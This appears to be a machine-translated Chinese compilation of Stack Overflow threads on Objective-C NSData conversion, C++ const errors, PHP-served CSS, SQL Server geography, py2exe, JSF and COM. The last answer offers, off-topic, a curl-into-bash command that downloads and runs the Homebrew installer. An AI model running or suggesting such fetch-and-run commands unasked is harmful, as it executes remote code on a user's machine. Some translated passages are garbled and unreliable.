我也试过（[从这里](http://www.cocoadev.com/index.pl?NSDataToNSString)）..

```
NSString *secondtry = [NSString stringWithCharacters:[name bytes] length:[name length] / sizeof(unichar)]; 
```

..但这似乎返回了一堆随机字符：

```
扵湵畴㠭ㄮⴰ敤歳潴⵰㍩㘸椮潳 
```

第一种方法（如 Apple 文档中所述）正确返回大部分数据的事实，以及一些额外的字节让我认为这可能是 BEncoding 库中的一个错误。但我对 ObjC 的了解更可能是有过错..

* * *

## 回答 #1

> 赞同：100
> 
> 时间：2009-03-02T23:39:24.243

这是我认为应该再次强调的重要一点。事实证明，

```
NSString *content = [NSString stringWithUTF8String:[responseData bytes]]; 
```

不一样，

```
NSString *content = [[NSString alloc]  initWithBytes:[responseData bytes]
              length:[responseData length] encoding: NSUTF8StringEncoding]; 
```

第一个需要一个 NULL 终止的字节字符串，第二个不需要。在上述两种情况下`content`，如果字节字符串未正确终止，则在第一个示例中将为 NULL。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2011-02-10T01:24:16.877

怎么样

```
NSString *content = [[[NSString alloc] initWithData:myData
                                           encoding:NSUTF8StringEncoding] autorelease]; 
```

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2009-02-17T00:07:11.983

> ```
> NSData *torrent = [BEncoding objectFromEncodedData:rawdata]; 
> ```
> 
> 当我 NSLog torrent 我得到以下信息：
> 
> ```
> {
>     ⋮
> } 
> ```

那将是一个 NSDictionary，而不是一个 NSData。

> ```
> unsigned char aBuffer[[name length]];
> [name getBytes:aBuffer length:[name length]];
> NSLog(@"File name: %s", aBuffer); 
> ```
> 
> ..它检索数据，但之后似乎有额外的 unicode 垃圾：
> 
> ```
> File name: ubuntu-8.10-desktop-i386.iso) 
> ```

不，它很好地检索了文件名；你只是打印不正确。`%s`接受一个以 null 结尾的 C 字符串；数据对象的字节不是以空值结尾的（它们只是字节，不一定是任何编码中的字符，而 0（作为字符为空）是一个完全有效的字节）。您必须再分配一个字符，并将数组中的最后一个字符设置为 0：

```
size_t length = [name length] + 1;
unsigned char aBuffer[length];
[name getBytes:aBuffer length:length];
aBuffer[length - 1] = 0;
NSLog(@"File name: %s", aBuffer); 
```

但是在 NSData 对象中以空值结尾的数据是错误的（除非您*确实*需要 C 字符串）。一会儿我会找到正确的方法。

> 我也试过 […]..
> 
> ```
> NSString *secondtry = [NSString stringWithCharacters:[name bytes] length:[name length] / sizeof(unichar)]; 
> ```
> 
> ..但这似乎返回随机汉字：
> 
> ```
> 扵湵畴㠭ㄮⴰ敤歳潴⵰㍩㘸椮潳 
> ```

那是因为您的字节是 UTF-8，它将一个字符（通常）编码为一个字节。

`unichar`是并`stringWithCharacters:length:`接受 UTF-16。在这种编码中，一个字符（通常）是两个字节。（因此除以`sizeof(unichar)`: 它将字节数除以 2 以获得字符数。）

所以你说“这里有一些 UTF-16 数据”，它会从每两个字节生成字符；每对字节应该是两个字符，而不是一个，所以你得到了垃圾（结果主要是 CJK 表意文字）。

* * *

您很好地[回答了您自己的问题](https://stackoverflow.com/questions/550405/convert-nsdata-bytes-to-nsstring/550412#550412)`stringWithUTF8String:`，除了这比`stringWithCString:encoding:`UTF-8 编码的字符串更简单。

然而，当你有长度时（就像你有一个 NSData 时一样），使用`initWithBytes:length:encoding:`. 它更容易，因为它不需要以空值结尾的数据；它只是使用您已有的长度。（不要忘记释放或自动释放它。）

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-08-26T00:49:14.503

一个不错的快速而肮脏的方法是使用`NSString`'s`stringWithFormat`初始化程序来帮助您。字符串格式化的不太常用的功能之一是能够在输出字符串时指定最大字符串长度。使用这个方便的功能可以`NSData`很容易地转换成字符串：

```
NSData *myData = [self getDataFromSomewhere];
NSString *string = [NSString stringWithFormat:@"%.*s", [myData length], [myData bytes]]; 
```

如果你想将它输出到日志中，它可以更容易：

```
NSLog(@"my Data: %.*s", [myData length], [myData bytes]); 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-02-15T06:22:13.153

啊哈，该`NSString`方法`stringWithCString`工作正常：

将`bencoding.h/.m`文件添加到您的项目后，完整的`.m`文件：

```
#import <Foundation/Foundation.h>
#import "BEncoding.h"

int main (int argc, const char * argv[]) {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];

    // Read raw file, and de-bencode
    NSData *rawdata = [NSData dataWithContentsOfFile:@"/path/to/a.torrent"];
    NSData *torrent = [BEncoding objectFromEncodedData:rawdata];

    // Get the file name
    NSData *infoData = [torrent valueForKey:@"info"];
    NSData *nameData = [infoData valueForKey:@"name"];
    NSString *filename = [NSString stringWithCString:[nameData bytes] encoding:NSUTF8StringEncoding];
    NSLog(@"%@", filename);

    [pool drain];
    return 0;
} 
```

..和输出：

```
ubuntu-8.10-desktop-i386.iso 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-16T01:18:58.200

在我无法控制要转换为字符串的数据的情况下，例如从网络读取数据，我更喜欢使用`NSString -initWithBytes:length:encoding:`它，这样我就不必依赖以 NULL 结尾的字符串来获得定义的结果。请注意，Apple 的文档说如果 cString 不是以 NULL 结尾的字符串，则结果未定义。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-03-02T00:06:33.390

在 NSData 上使用一个类别：

NSData+NSString.h

```
@interface NSData (NSString)

- (NSString *)toString;

@end 
```

NSData+NSString.m

```
#import "NSData+NSString.h"

@implementation NSData (NSString)

- (NSString *)toString
{
    Byte *dataPointer = (Byte *)[self bytes];
    NSMutableString *result = [NSMutableString stringWithCapacity:0];
    NSUInteger index;
    for (index = 0; index < [self length]; index++)
    {
        [result appendFormat:@"0x%02x,", dataPointer[index]];
    }
    return result;
}

@end 
```

然后就`NSLog(@"Data is %@", [nsData toString])"`

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-08-05T09:45:51.970

你可以试试这个。我都可以。

```
DLog(@"responeData: %@", [[[NSString alloc] initWithBytes:[data bytes] length:[data length] encoding:NSASCIIStringEncoding] autorelease]); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-10-05T15:21:14.230

有时您需要从 NSData 创建 Base64 编码的字符串。例如，当您创建电子邮件 MIME 时。在这种情况下，请使用以下内容：

```
#import "NSData+Base64.h"
NSString *string = [data base64EncodedString]; 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-06-05T06:16:21.180

这将起作用。

```
NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]; 
```

# c++ - 设计一个惰性向量：const 的问题

> ID：550418
> 
> 赞同：0
> 
> 时间：2009-02-15T06:34:10.240
> 
> 标签：c++, vector, constants, lazy-loading

我写了一个小“惰性向量”类（或延迟向量），它应该看起来像 a`std::vector`并且可以在使用 a`std::vector`的任何地方使用，但它会“惰性”加载它的元素，即它会加载元素`n`（可能还有更多）每当有人访问 element 时从磁盘中获取`n`。（原因是在我的应用程序中，并非所有元素都适合内存。）

这是此类`LazyVector`，但`const`使用此类向量的成员函数存在问题，请参见下文。

```
template<class T>
class LazyVector {
  std::vector<T> elems_;
  void fetchElem(unsigned n){
    // load the n-th elem from disk into elems_ etc
  }
public:
  const T& operator[](unsigned n) const {
    fetchElem(n); // ERROR: ... discards qualifiers       
    return elems_[n];
  }
  T& operator[](unsigned n) {
    fetchElem(n);
    return elems_[n];
  }
  // and provide some other std::vector functions
}; 
```

正如我所说，当`const`成员函数请求`LazyVector`. 本质上`LazyVector`，访问一个元素*不是* `const`，即它会改变`vec`下面的向量，这在这种情况下是被禁止的。`foo`成员函数必须`const`且不能更改。我该如何解决这个问题？

```
class Foo {
  LazyVector<const std::string*> vec;
  void fct(int n) const { // fct must be const 
    const std::string* str = vec[n];
    // do something with str 
  }
}; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-02-15T06:40:20.910

您可以在 LazyVector 类的实现中使用可变成员数据或 const_cast。因此，您可以创建消费类所需的 const 错觉，而无需实际成为 const。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T06:37:55.083

在 elems_ 数据成员上使用[mutable关键字。](http://www.parashift.com/c++-faq-lite/const-correctness.html#faq-18.13)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-02-15T08:32:19.023

const 运算符用于表明对象在逻辑上是 const。
您的数据在磁盘上的事实既不是在这里也不是您的对象没有改变状态，因此您可以将实际保存数据的工作委托给另一个对象缓存（存储数据的位置是实现细节，而不是对象状态）。

```
class LazyVector
{
    public:
        int const& operator[](int index) const
        { 
            data->fetchElement(index);
            return data->get(index);
        }
    private:
        std::auto_ptr<LazyDataCache>   data;
}; 
```

这里的 data 是一个指针（一个智能指针，但仍然是一个指针）。只要指针不改变，你就不会改变 LazyVector 的成本。但是您仍然可以在 data 指向的对象上调用非 const 方法（请记住，指针是 const 而不是指向的对象）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-15T06:39:57.043

对于这样的事情，`mutable`关键字是for。将缓存作为可变对象放入您的类中。那是因为您的缓存似乎不会改变对象的逻辑内容/状态（即向量的元素或它的大小不会改变）。

`const`方法并未声明它们不会物理更改您的对象。他们声明他们不会改变对象的抽象值。抽象出来的实现细节仍然可以被 const 函数改变。

可变的适用于这种情况。使您的向量可变或添加包含某种缓存条目的可变缓存成员。

阅读 Anthony Williams 的[What are the semantics of a const member function](https://stackoverflow.com/questions/98705/what-are-the-semantics-of-a-const-member-function/100593#100593) answer。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T06:39:08.277

声明`elems_`为`mutable`：

`mutable std::vector<T> elems_;`

您还可以做其他事情，但这是受支持的方式。

编辑：另一种方法是添加另一个成员并将其设置在构造函数中：

`std::vector<T> *mutable_elems_;`

`mutable_elems_(&elems_)`

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-02-15T06:42:06.803

这样做的一种粗略方法是

```
LazyVector* p = const_cast<LazyVector*>(this);
p->fetch(); 
```

我想会有更好的方法来做到这一点。但这会起作用。

# c++ - 一个奇怪的 C++ 错误：test.cpp:15: 错误：将 'const *' 作为 '*' 的 'this' 参数传递会丢弃限定符

> ID：550428
> 
> 赞同：43
> 
> 时间：2009-02-15T06:43:14.290
> 
> 标签：c++, compiler-errors, constants

我在使用一段特定的代码时遇到了一些问题，如果有人能在这件事上给我启发，我将不胜感激，我已在以下示例中隔离了问题：

```
#include <iostream>

using namespace std;

class testing{
   int test();
   int test1(const testing& test2);
};

int testing::test(){
   return 1;
}

int testing::test1(const testing& test2){
   test2.test();
   return 1;
} 
```

那么可能导致以下错误的原因是：

test.cpp:15：错误：将 'const testing' 作为 'int testing::test()' 的 'this' 参数传递会丢弃限定符

非常感谢！

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2009-02-15T06:45:27.047

问题是从. `const`_ _`test2.test()``const``test2``testing::test1`

`testing::test1`获取`test2`作为参数`const testing &test2`。所以在`testing::test1`, `test2const`. 然后在函数的第一行：

```
test2.test() 
```

该`testing::test`函数在 上调用`test2`。该函数没有`const`在签名结束时声明，因此它可能会修改调用它的对象（`this`隐式传递给它的指针），即使它没有，编译器也会假设。通过让您在那里调用它，编译器将允许您在`const`没有显式转换的情况下修改变量，这是 C++ 不应该允许的。 **因此解释错误信息**：

```
test.cpp:15: error: passing ‘const testing’ as ‘this’ argument of ‘int testing::test()’ discards qualifiers 
```

`this`引用成员函数 ( `testing::test`) 操作的对象，在这种情况下它不是`const`，因为`testing::test`没有用 声明`const`，因此在尝试使非`const`指针 ( `this`) 引用`const`对象 ( `testing`) 时检测到不匹配，忽略`const` *限定符*。_

**为了解决这个问题**，决定`testing::test`函数是否需要修改它被调用的对象（它现在的编写方式不需要，因为它所做的只是`return 1`，但是可能会改变，所以你需要考虑它的意图功能是）。如果应该，那么显然在`const`对象上调用它是不好的，尽管您可以使用`const_cast`要求编译器覆盖它，但这很危险。如果不应该，则标记它`const`，以便它也可以在`const`对象上调用：

```
class testing{
    int test1() const;
    // ...
}

int testing::test() const {
    // ...
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T07:02:28.267

由于成员函数test1的定义：

```
int testing::test1(const testing& test2){
   test2.test();
   return 1;
} 
```

您正在传递变量 test2 的 const 引用。

这意味着您不能修改 test2 的任何成员，也不能调用任何非 const 或非静态的成员函数。

以下是您可以修复的方法：

```
int testing::test() const {
   return 1;
} 
```

最后额外的 const 告诉编译器你不打算修改当前对象的内容（如果你这样做了，你会得到一个不同的编译错误）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-15T06:46:24.437

行：test2.test()

正在调用非 const 函数，即使 test2 是 const 引用。那就是问题所在。您可以通过将 testing::test 设为 const 函数来解决此问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T07:11:54.987

testing::test1(const testing& test2) 期望传递的对象是 const，如果你修改它的变量的值，或者访问没有明确定义为 const 的任何方法，它会给你一个错误。

由于 test() 方法实际上不会更改任何数据，因此最佳做法是将其设置为 const，如下所示：

```
class testing{
   int test() const;
   int test1(const testing& test2);
};

int testing::test() const {
   return 1;
} 
```

或者，在为 test1() 定义参数时，只需删除 const 一词，它将允许您在闲暇时访问任何传递的对象的方法。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2015-05-26T14:18:58.513

For a quick and dirt solution, try compiling with `-fpermissive` as often suggested by the compiler itself (which is probably what VisualStudio compilers do, being that Windows users seldom report this problem).

# php - 在 css 文档中使用 php 是一个坏主意吗？

> ID：550430
> 
> 赞同：3
> 
> 时间：2009-02-15T06:44:46.453
> 
> 标签：php, css

我创建了名为 style.php 的 CSS 页面，并将其包含在顶部：

`<?php header("Content-type: text/css"); ?>`

这会让你畏缩吗。这是一个可怕的想法吗？我这样做是因为我创建了一个 CMS，它允许管理员控制页面上的颜色（因此 style.php 脚本查询数据库并获取十六进制值）。

有什么想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T07:57:07.157

这不是一个坏主意（取决于关于缓存 + 内容类型的注释），但请考虑启动 PHP 实例 (mod_php) 或将脚本传递给已经运行的 php（fastcgi 样式）的成本。你真的想要那个开销吗？

您最好将 CSS 页面的“缓存”版本写入静态文件并提供服务（或者如果您需要每页的灵活性，请选择要包含的样式表；我假设您的主页已经是 PHP）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-15T06:51:04.740

这是一个很好的解决方案，只需确保您提供了适当的标题。请参阅[我](http://hype-free.blogspot.com/2007/07/serving-up-authenticated-static-files.html)关于相关主题的博文（搜索“重要的标题是”以进入正确的部分）。

还有一件事：

使用缓存，您可能会遇到用户更改她想要看到的颜色的情况，但是（因为它被缓存在客户端），页面不会更新。要使缓存无效，请在 URL 的末尾附加一个 ?=id，其中 ID 是为用户存储的数字（例如在会话中），每次更改配色方案时都会递增。

例子：

*   起初，用户有一个样式表[http://example.com/style.php?id=0](http://example.com/style.php?id=0)
*   当她改变颜色时，她会得到[http://example.com/style.php?id=1](http://example.com/style.php?id=1)的 url等等。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T06:51:15.567

假设您使用适当的缓存，因为我认为 CMS 驱动的值可能不会经常更改，没有特定理由避免动态创建 CSS 包含。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T07:35:00.733

这不是一个坏主意。这是一个有很多好处的创意：

*   您的用户可以定义不需要担心安全性的值（解析 css 很困难）
*   您可以强制执行一组视觉上更一致的皮肤（一些灵活性优于总灵活性）
*   代码简单

# sql-server-2008 - 选择区域内的地理点

> ID：550445
> 
> 赞同：2
> 
> 时间：2009-02-15T07:04:46.000
> 
> 标签：sql-server-2008, geography

我有一个带有地理数据类型列的 SQL Server 2008 表。该值是一个点（纬度和经度）。

如何查询表以返回位置在给定坐标的 10 公里半径内的所有行？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T07:28:09.423

您可能需要 STDistance 方法：http: [//msdn.microsoft.com/en-us/library/bb933952.aspx](http://msdn.microsoft.com/en-us/library/bb933952.aspx)

或 STWithin 方法：http: [//msdn.microsoft.com/en-us/library/bb933991.aspx](http://msdn.microsoft.com/en-us/library/bb933991.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-15T07:42:45.273

这个查询最终解决了我的问题：

```
DECLARE @geoMyPoint geography
SET @geoMyPoint = geography::STGeomFromText('POINT(56.5667 9.0333)', 4326);

SELECT vchZipCode, nvcCity, vchLat, vchLong,
  (geography::STGeomFromText('POINT(' + vchLat + ' ' + vchLong + ')', 4326)).STDistance(@geoMyPoint) 
FROM MyTable 
```

# python - py2exe 生成dll？

> ID：550446
> 
> 赞同：13
> 
> 时间：2009-02-15T07:06:26.043
> 
> 标签：python, windows, dll, py2exe

有没有办法使用 py2exe 或其他方法来生成 dll 文件而不是 exe 文件？

我想基本上用普通函数创建一个普通的win32 dll，但这些函数将用python而不是c++编码。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-02-28T22:13:25.370

我认为你可以通过做一些黑客攻击来解决这个问题：

*   看看 py2exe 中的 zipextimporter 模块。它有助于从 zip 导入 pyd 文件。
*   使用它，您也许可以使用原始 python-api 在您自己的应用程序/dll 中加载 py2exe 的输出文件。（如果可以并且愿意，请使用 boost::python）
*   而且，由于 py2exe 的输出文件是一个 zip，您可以将其附加到 dll 的末尾，从而使整个内容更加集成。（也适用于 jar 文件的旧技巧。）

没有经过测试，但我认为这个理论是合理的。

本质上，您在 dll 中重新实现了 py2exe 的输出可执行文件的 main()。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-15T18:36:51.130

我怀疑 py2exe 会这样做，因为它的架构是围绕提供一个引导 .exe 来推出 python 解释器并运行它。

但为什么不直接将 Python 嵌入 C 代码中，然后将该代码编译为 DLL？

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-15T07:27:15.103

我不知道`py2exe`能够做到这一点，因为我相信它实际上并没有从你的 Python 代码中生成对象符号，而只是将编译后的字节码嵌入到 Python 运行时的可执行文件中）。

使用 Python-C API 创建本机库可能需要更多工作（定义 C/C++ 接口）。[使用Elmer](http://elmer.sourceforge.net/)可能会更容易一些。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-10-02T14:25:54.987

对于后代，我最近能够使用[Elmer](https://wiki.python.org/moin/elmer)成功生成可用的 DLL。他们的网站[有一个构建加载 python 代码的 DLL 包装器的示例](http://elmer.sourceforge.net/examples.html)。这很酷，因为您可以动态更改 python 代码以更改 DLL 行为以进行调试。

不幸的是，对我来说，我想要一个无需安装 python 就可以工作的可移植 DLL。那部分并不是开箱即用的。这里没有重复所有步骤，而是链接到我采取的步骤的答案：[https](https://stackoverflow.com/a/24811840/3841168) ://stackoverflow.com/a/24811840/3841168 。我确实必须分发 python27.dll、elmer.dll 和几个 .pyd 以及我的 .dll；由于 python27.dll 通常不是静态链接的，因此还需要适当的 .net 运行时。可能有一些方法可以包含大量 dll，但我不介意分发多个 DLL，所以我没有深入研究它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-06-02T20:27:03.450

看起来可以从 py2exe 生成 COM DLL：

[http://www.py2exe.org/index.cgi/Py2exeAndCtypesComDllServer](http://www.py2exe.org/index.cgi/Py2exeAndCtypesComDllServer)

```
 23     my_com_server_target = Target(
  24     description = "my com server",
  25     # use module name for ctypes.com dll server
  26     modules = ["dir.my_com_server"],
  27     # the following line embeds the typelib within the dll
  28     other_resources = [("TYPELIB", 1, open(r"dir\my_com_server.tlb", "rb").read())],
  29     # we only want the inproc (dll) server
  30     create_exe = False
  31     ) 
```

# session - 从 JSF 页面获取请求和会话参数和属性

> ID：550448
> 
> 赞同：56
> 
> 时间：2009-02-15T07:07:39.003
> 
> 标签：session, jsf, request, facelets

我正在使用带有 facelets 的 JSF，我需要在 JSF 页面中获取请求和会话参数。在 JSP 页面中，我得到了这样的参数：`"${requestScope.paramName}"`或`"${sessionScope.paramName}"`. 但是现在使用 JSF 后只有 bean，除了 bean 属性之外，您无法获取任何值。

注意：我需要的会话属性是使用 acegi 安全性自动填充的，因此我无法访问它们。

那么现在该怎么办呢？

* * *

## 回答 #1

> 赞同：92
> 
> 时间：2009-02-15T11:07:52.723

您可以使用以下表达式获取请求参数*id ：*

```
<h:outputText value="#{param['id']}" /> 
```

*   *param* — 此请求的请求参数的不可变 Map，以参数名称为键。仅包含每个参数名称的第一个值。
*   *sessionScope* — 此请求的会话属性映射，以属性名称为键。

[JSF 1.0 规范](http://java.sun.com/javaee/javaserverfaces/reference/api/)的第 5.3.1.2 节定义了必须由变量解析器解析的对象。

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2009-02-17T20:01:18.007

您还可以使用 bean（建议使用请求范围）并通过 FacesContext 直接访问上下文。

您可以使用以下代码获取 HttpServletRequest 和 HttpServletResposne 对象：

```
HttpServletRequest req = (HttpServletRequest)FacesContext.getCurrentInstance().getExternalContext().getRequest();
HttpServletResponse res = (HttpServletResponse)FacesContext.getCurrentInstance().getExternalContext().getResponse(); 
```

在此之后，您可以通过对象访问单个参数`getParameter(paramName)`或访问完整地图`getParameterMap()` `req`

我建议使用请求范围 bean 的原因是您可以在初始化期间使用它们（最坏的情况是构造函数。大多数框架在 bean 初始化时为您提供了一些地方来编写代码）并且它们将在您的请求到来时完成。

然而，这有点像黑客。;) 你可能想看看是否有一个 JSF Acegi 模块可以让你访问你需要的变量。

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2011-11-15T09:28:41.177

您可以使用

`<h:outputText value="#{param['id']}" />`或者

`<h:outputText value="#{request.getParameter('id')}" />`

但是，如果您想将参数传递给您的支持 bean，那么 using`f:viewParam`可能就是您想要的。“视图参数是查询字符串参数和模型值之间的映射。”

`<f:viewParam name="id" value="#{blog.entryId}"/>`

这会将 GET 参数的 id 参数设置为 blog bean 的`entryId`字段。有关详细信息，请参阅[http://java.dzone.com/articles/bookmarkability-jsf-2](http://java.dzone.com/articles/bookmarkability-jsf-2)。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2012-11-12T08:34:51.627

你可以这样：

```
#{requestScope["paramName"]} ,#{sessionScope["paramName"]} 
```

因为`requestScope`or`sessionScope`是一个 Map 对象。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2010-02-08T16:40:13.443

您还可以使用 OcpSoft 的[PrettyFaces](http://ocpsoft.com/prettyfaces/)之类的工具将动态参数值直接注入 JSF Beans。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-07-17T12:03:06.620

假设您已经将对象作为属性放在`FacesContext`托管 bean 的当前实例的会话映射上，您可以通过以下方式从 JSF 页面获取它：

```
<h:outputText value="#{sessionScope['yourObject'] }" /> 
```

如果您的对象具有属性，请通过以下方式获取它：

```
<h:ouputText value="#{sessionScope['yourObject'].anyProperty }" /> 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2009-02-18T09:32:03.783

您确定无法从 JSF 页面访问请求/会话范围变量吗？

这就是我在登录页面中使用 Spring Security 所做的：

```
<h:outputText
    rendered="#{param.loginFailed == 1 and SPRING_SECURITY_LAST_EXCEPTION != null}">
    <span class="msg-error">#{SPRING_SECURITY_LAST_EXCEPTION.message}</span>
</h:outputText> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-03-19T13:26:52.617

在 bean 中，您可以使用 session.getAttribute("attributeName");

# python - 在 python 中实现一些自定义 IDL 的 COM 对象的快速入门？

> ID：550450
> 
> 赞同：0
> 
> 时间：2009-02-15T07:08:18.147
> 
> 标签：python, com

有没有人有使用 python 创建实现一些自定义 IDL 的 COM 对象的经验？

基本上我想知道与c ++相比它是否非常简单，如果它是你知道一个好的教程吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T07:25:01.863

您正在寻找的教程在 Mark Hammond 和 Andy Robinson 的[Python Programming On Win32](http://oreilly.com/catalog/9781565926219/)书中。有点旧，COM 对象创建信息分布在一些章节中。

一个较新的示例，[使用 Python 的简单 COM 服务器](http://techarttiki.blogspot.com/2008/03/calling-python-from-maxscript.html)，可以让您快速入门。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T10:31:59.953

还有[comtypes](http://pypi.python.org/pypi/comtypes)，它允许访问和实现自定义接口。一篇关于[codeproject](http://www.codeproject.com/KB/COM/python-comtypes-interop.aspx)的文章有一个很好的教程。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-06T18:46:01.097

您还应该查看gimel 提到的 Python Programming On Win32 中的[Advance COM](http://oreilly.com/catalog/pythonwin32/chapter/ch12.html)的免费章节。

# c++ - 在任何情况下 new 都会返回 NULL 吗？

> ID：550451
> 
> 赞同：56
> 
> 时间：2009-02-15T07:10:59.120
> 
> 标签：c++, visual-c++, memory-management, new-operator, visual-c++-6

我知道根据 C++ 标准，如果 new 无法分配内存，它应该抛出 std::bad_alloc 异常。但我听说一些编译器，如 VC6（或 CRT 实现？）不遵守它。这是真的 ？我问这个是因为在每个新语句之后检查 NULL 会使代码看起来非常难看。

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2009-02-15T07:16:12.883

VC6 在这方面默认是不合规的。VC6 的`new`返回`0`（或`NULL`）。

这是 Microsoft 关于此问题的知识库文章以及他们建议的使用自定义`new`处理程序的解决方法：

*   [运算符 new 在 Visual C++ 中失败时不会引发 bad_alloc 异常](http://support2.microsoft.com/kb/167733/en-us)

如果您有为 VC6 行为编写的旧代码，您可以通过链接一个名为`nothrownew.obj`. 实际上，在 7.0 和 7.1 编译器（VS2002 和 VS2003）中有一[组相当复杂的规则](http://msdn.microsoft.com/en-us/library/kftdy56f(VS.71).aspx)来确定它们是默认为 non-throwing 还是 throwing `new`。

似乎[MS 在 8.0 (VS2005) 中对此进行了清理](http://msdn.microsoft.com/en-us/library/kftdy56f.aspx)——现在它始终默认为 throwing new，除非您特别链接到`nothrownew.obj`.

请注意，您可以使用参数指定要`new`返回`0`而不是抛出：`std::bad_alloc``std::nothrow`

```
SomeType *p = new(std::nothrow) SomeType; 
```

这似乎在 VC6 中有效，因此它可能是一种或多或少机械地修复代码以与所有编译器相同的方法，因此您不必重新处理现有的错误处理。

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2009-02-15T09:18:54.497

我想补充一个（有点争议的）观点，即在分配尝试后检查 NULL 几乎是徒劳的。如果您的程序遇到这种情况，您可能只能快速退出。任何后续分配尝试也很可能会失败。

如果不检查 NULL，您的后续代码将尝试取消引用 NULL 指针，这往往会以相对独特（且易于调试）的退出条件快速退出程序。

我并不是要劝你不要检查 NULL，这肯定是认真的编程。但是您不会从中获得太多收益，除非在非常特殊的情况下，您可能可以存储一些恢复信息（无需分配更多内存），或者释放不太重要的内存等。但是对于大多数人来说，这些情况相对较少。

鉴于此，我只相信编译器会亲自抛出 bad_alloc - 至少在大多数情况下是这样。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-02-15T07:13:00.863

根据 C++ 规范，当您只使用没有参数的普通 new 时，它总是会抛出 std::bad_alloc，但当然可能会有一些不兼容的编译器。

不过，我不会编写符合非 c++ 兼容编译器的代码。VC6 在这方面就是其中之一。

但是，在删除它们后始终将指针设置为 NULL 是一种很好的做法。因此，仍然需要检查 NULL。

话虽如此，这里有几个清理代码的选项：

**选项 1：设置您自己的新处理程序**

清理代码的一种安全方法是首先调用：[set_new_handler](http://msdn.microsoft.com/en-us/library/5fath9te(VS.80).aspx)。

然后，您可以在处理程序中检查 NULL 并在返回 NULL 时将 std::bad_alloc 扔在那里。

如果您更喜欢异常，那么这是您最好的选择。如果您希望更好地返回 NULL，那么您也可以通过在新处理程序中执行 catch 来做到这一点。

**选项 2：使用重载的 new**

c++ 标准头文件定义了一个空的结构 nothrow。您可以在 new 中使用此结构的对象来获取其始终返回 NULL 的重载版本。

```
void* operator new (size_t size, const std::nothrow_t &);
void* operator new[] (void *v, const std::nothrow_t &nt); 
```

所以在你的代码中：

```
 char *p = new(std::nothrow) char[1024]; 
```

这是[进一步阅读的好参考](http://www.informit.com/guides/content.aspx?g=cplusplus&seqNum=170)

# c++ - 编译错误：未定义符号：“_main”，引用自：crt1.10.5.o开始

> ID：550455
> 
> 赞同：21
> 
> 时间：2009-02-15T07:14:04.153
> 
> 标签：c++

我有以下代码：

```
#include <iostream>

using namespace std;

class testing{
   int test() const;
   int test1(const testing& test2);
};

int testing::test() const{
   return 1;
}

int testing::test1(const testing& test2){
   test2.test();
   return 1;
} 
```

编译后，它给了我以下错误：

```
Undefined symbols:
  "_main", referenced from:
      start in crt1.10.5.o
ld: symbol(s) not found
collect2: ld returned 1 exit status 
```

为什么抱怨主要？我不能在另一个文件中声明 main 并包含这个吗？

非常感谢！

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2009-02-15T07:20:48.897

您已经尝试链接它：

```
g++ file.cpp 
```

这不仅会编译它，而且会尝试已经创建可执行文件。然后链接器无法找到它需要的主函数。好吧，这样做：

```
g++ -c file.cpp
g++ -c hasmain.cpp 
```

这将创建两个文件 file.o 和 hasmain.o，到目前为止都只编译过。现在您可以使用 g++ 将它们链接在一起：

```
g++ -omy_program hasmain.o file.o 
```

它会自动找出那些是已经编译的文件，并在它们上调用链接器来创建一个文件“my_program”，这是您的可执行文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T07:18:39.133

如果在另一个文件中声明主函数，则必须分别编译这两个文件，然后将它们链接到 1 个可执行文件中。

除非您将文件的全部内容包含在 main 函数中，否则它也可以工作，尽管有点奇怪。但是，如果这样做，则必须确保编译具有 main() 函数的文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-11-10T05:51:30.900

试试这些（他们为我工作）：

*   `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"`
